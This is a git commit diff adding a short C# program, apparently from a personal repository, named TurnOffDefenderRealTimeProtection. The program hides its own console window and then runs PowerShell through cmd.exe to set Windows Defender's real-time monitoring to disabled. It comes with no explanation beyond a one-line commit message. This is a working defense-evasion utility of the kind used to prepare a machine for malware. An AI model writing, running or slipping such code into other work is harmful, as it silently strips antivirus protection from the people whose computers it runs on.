dd3059b501faa81049f698ddae742fb13ba05670
jingwu1986@hotmail.com <jingwu1986@hotmail.com>
2022-10-11 14:26:05 +0800

    添加项目文件。

---
+++ TurnOffDefenderRealTimeProtection/Program.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace TurnOffDefenderRealTimeProtection
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        static void Main(string[] args)
+        {
+            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
+            ShowWindow(h, 0);
+
+            System.Threading.Thread.Sleep(1);
+
+            string fileName = "cmd.exe";
+
+            var commands = new string[] { "powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true" };
+
+            ProcessHelper.ExecuteCommands(fileName, "", commands, Process_ErrorDataReceived);
+        }
+
+        private static void Process_ErrorDataReceived(object sender, DataReceivedEventArgs e)
+        {
+            if (!string.IsNullOrEmpty(e.Data))
+            {
+                Console.WriteLine(e.Data);
+            }
+        }
+    }
+}
